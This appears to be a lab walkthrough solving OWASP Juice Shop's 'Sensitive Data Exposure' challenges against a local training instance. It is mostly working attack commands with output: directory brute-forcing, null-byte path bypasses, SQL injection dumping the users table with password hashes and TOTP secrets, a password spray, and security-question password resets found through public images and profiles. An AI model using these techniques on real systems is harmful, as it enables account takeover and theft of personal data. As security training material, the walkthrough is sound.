# Sensitive Data Exposure

## Access Log

Wordlists
* [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
* [dirb/wordlists](https://github.com/v0re/dirb/tree/master/wordlists)
* [kalilinux/dirbuster](https://gitlab.com/kalilinux/packages/dirbuster)

Gain access to any access log file of the server

```bash
# status code is rigged (always 200 instead of 404): ignore 200 with fixed size and add delay to avoid crashing the server
gobuster dir -u http://juiceshop:3000/ \
  -w /hck/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  --exclude-length 3748 -t 1 --delay 50ms
# output
# /.well-known/security.txt (Status: 200) [Size: 403]
# /api                  (Status: 500) [Size: 3017]
# /assets               (Status: 301) [Size: 179] [--> /assets/]
# /ftp                  (Status: 200) [Size: 11072]
# /profile              (Status: 500) [Size: 1159]
# /promotion            (Status: 200) [Size: 6586]
# /redirect             (Status: 500) [Size: 3119]
# /rest                 (Status: 500) [Size: 3019]
# /robots.txt           (Status: 200) [Size: 28]
# /security.txt         (Status: 200) [Size: 403]
# /snippets             (Status: 200) [Size: 792]
# /video                (Status: 200) [Size: 10075518]

# challenge description suggests "support" team from "/ftp/" path
curl -O juiceshop:3000/ftp/incident-support.kdbx

gobuster fuzz -u http://juiceshop:3000/support/FUZZ \
  -w /hck/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  --exclude-length 3748 -t 1 --delay 50ms

curl "http://juiceshop:3000/support/logs/access.log.$(date '+%Y-%m-%d')"
```

## Confidential Document

Access a confidential document

```bash
# http://juiceshop:3000/ftp/order_<ORDER_ID>.pdf
curl -O http://juiceshop:3000/ftp/acquisitions.md
```

## Email Leak

* [Wikipedia JSONP](https://en.wikipedia.org/wiki/JSONP)

Perform an unwanted information disclosure by accessing data cross-domain

```bash
http http://juiceshop:3000/rest/user/whoami
# {"user":{}}

# auth is ignored
http http://juiceshop:3000/rest/user/whoami?callback=foo
# /**/ typeof foo === 'function' && foo({"user":{}});
```

## Exposed Metrics

* [Prometheus](https://prometheus.io/docs/introduction/overview)

Find the endpoint that serves usage data to be scraped by a popular monitoring system

```bash
http http://juiceshop:3000/metrics
```

## Forgotten Developer Backup

* [Null byte attacks are alive and well](https://portswigger.net/blog/null-byte-attacks-are-alive-and-well)
* [Common PHP attacks: Poison Null Byte](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)

Access a developer's forgotten backup file

```bash
# %00 -> url encoded %2500
curl http://juiceshop:3000/ftp/package.json.bak%2500.md
```

## Forgotten Sales Backup

Access a salesman's forgotten backup file

```bash
curl http://juiceshop:3000/ftp/coupons_2013.md.bak%2500.pdf
```

## GDPR Data Theft

Steal someone else's personal data without using Injection

```bash
# register user qwerty@xyz.com
curl -sS http://juiceshop:3000/api/Users/ -H 'Content-Type: application/json' --data-raw $'{"email":"qwerty@xyz.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":3,"question":"Mother\'s birth date? (MM/DD/YY)","createdAt":"2023-11-07T08:41:38.130Z","updatedAt":"2023-11-07T08:41:38.130Z"},"securityAnswer":"000000"}' | jq

# login + complete an order

# email format with vowel obfuscated "qw*rty@xyz.c*m"
# http://juiceshop:3000/rest/track-order/388a-01862722732380de

# reqister new ueser with different vowels e.g. qw[a]rty@xyz.com and export gdpr data
```

## Leaked Access Logs

* [CyberChef URL Decode](https://gchq.github.io/CyberChef/#recipe=URL_Decode())
* decode in `parrot-sec`
    ```bash
    ./scripts/install_python.sh
    source ~/.bash_parrot
    urldecode '<VALUE>'
    ```

Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to

```bash
# "very popular help platform for developers" -> stackoverflow
# "platform often used to share data quickly" -> pastebin
https://stackoverflow.com/users/959592/bkimminich
https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan
https://pastebin.com/4U1V1UjU

curl -sS https://pastebin.com/raw/4U1V1UjU | grep pass
# 161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET /rest/user/change-password?current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB&new=sjss22%@%E2%82%AC55jaJasj!.k&repeat=sjss22%@%E2%82%AC55jaJasj!.k8 HTTP/1.1" 401 39 "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"

# passwords
# current: 0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB
# new: sjss22%@%E2%82%AC55jaJasj!.k
# repeat: sjss22%@%E2%82%AC55jaJasj!.k8

# passwords decoded
# current: 0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB
# new: sjss22%@€55jaJasj!.k
# repeat: sjss22%@€55jaJasj!.k8

# list of all users
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | \
  jq -r '.data[].description' > /hck/share/users.txt

# password spray
hckctl task legba --inline -- legba http \
  --target http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login \
  --username /hck/share/users.txt \
  --password '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB' \
  --http-method POST \
  --http-payload 'email={USERNAME}&password={PASSWORD}'

# alternative https://github.com/evilsocket/legba/issues/24
hckctl task legba --inline -- legba http \
  --target http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login \
  --username /hck/share/users.txt \
  --password '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB' \
  --http-method POST \
  --http-payload '{"email":"{USERNAME}","password":"{PASSWORD}"}' \
  --http-headers "Content-Type=application/json"

# verify
http http://juiceshop:3000/rest/user/login email="J12934@juice-sh.op" password='0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'
```

## Leaked Unsafe Product

Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous

```bash
# list all products
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'+OR+1==1));--" | jq
# list deleted products
curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'+OR+deletedAt+IS+NOT+NULL));--" | jq

# search for
# Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos
https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know

# comment Rippertuer Special Juice
https://pastebin.com/90dUgd7s

# read warning
# Hueteroneel ... coupled with Eurogium Edule was sometimes found fatal

# generate captcha
curl http://juiceshop:3000/rest/captcha
# {"captchaId":3,"captcha":"7*5*3","answer":"105"}

# submit request
curl -H "Content-Type: application/json" http://juiceshop:3000/api/Feedbacks --data-raw '{"captchaId":6,"captcha":"25","comment":"Hueteroneel Eurogium Edule","rating":1}'
```

## Login Amy

Log in with Amy's original user credentials

```bash
# husband: Kif Kroker
# https://futurama.fandom.com/wiki/Amy_Wong-Kroker

# The challenge description contains a few sentences which give away some information how Amy decided to strengthen her password.
# (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")
# https://www.grc.com/haystack.htm

http http://juiceshop:3000/rest/user/login email="amy@juice-sh.op" password="K1f....................."
```

## Login MC SafeSearch

Log in with MC SafeSearch's original user credentials

```bash
# https://www.youtube.com/watch?v=v59CX2DiX0Y
http http://juiceshop:3000/rest/user/login email="mc.safesearch@juice-sh.op" password="Mr. N00dles"
```

## Meta Geo Stalking

Determine the answer to John's security question

```bash
curl -sS -O http://juiceshop:3000/assets/public/images/uploads/favorite-hiking-place.png

# GPS Position
exiftool favorite-hiking-place.png

# convert https://gps-coordinates.org/coordinate-converter.php
# DMS (degrees, minutes, seconds): 36 deg 57' 31.38" N, 84 deg 20' 53.58" W
# DD (decimal degrees): 36.95871666666667, -84.34821666666666
# address: 1–251 Two Bridge Rd, London, KY 40744, United States

# security question: What's your favorite place to go hiking?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"john@juice-sh.op","answer":"Daniel Boone National Forest","new":"12345","repeat":"12345"}'
```

## Misplaced Signature File

* [Sigma - Generic Signature Format for SIEM Systems](https://sigmahq.io)

Access a misplaced SIEM signature file.
```bash
curl http://juiceshop:3000/ftp/suspicious_errors.yml%2500.md -o suspicious_errors.yml
```

<!--
## NFT Takeover

Take over the wallet containing our official Soul Bound Token (NFT).

```bash
TODO missing
```
-->

## Reset Uvogin's Password

Reset Uvogin's password via the Forgot Password mechanism

```bash
https://villains.fandom.com/wiki/Uvogin
# first
https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin
# last
https://web.archive.org/web/20230430084022/https://twitter.com/uv0gin

# security question: Your favorite movie?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"uvogin@juice-sh.op","answer":"Silence of the Lambs","new":"12345","repeat":"12345"}'
```

## Retrieve Blueprint

Deprive the shop of earnings by downloading the blueprint for one of its products

```bash
curl -O http://juiceshop:3000/assets/public/images/products/3d_keychain.jpg

# manufacturer=OpenSCAD
# model=https://imgur.com/a/GeHQP
exiftool 3d_keychain.jpg

# https://en.wikibooks.org/wiki/OpenSCAD_User_Manual/STL_Import_and_Export
curl -O http://juiceshop:3000/assets/public/images/products/JuiceShop.stl
```

## Visual Geo Stalking

Determine the answer to Emma's security question

```bash
curl -sSO http://juiceshop:3000/assets/public/images/uploads/IMG_4253.jpg

# try google upload https://images.google.com

# security question: Company you first work for as an adult?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"emma@juice-sh.op","answer":"ITsec","new":"12345","repeat":"12345"}'
```
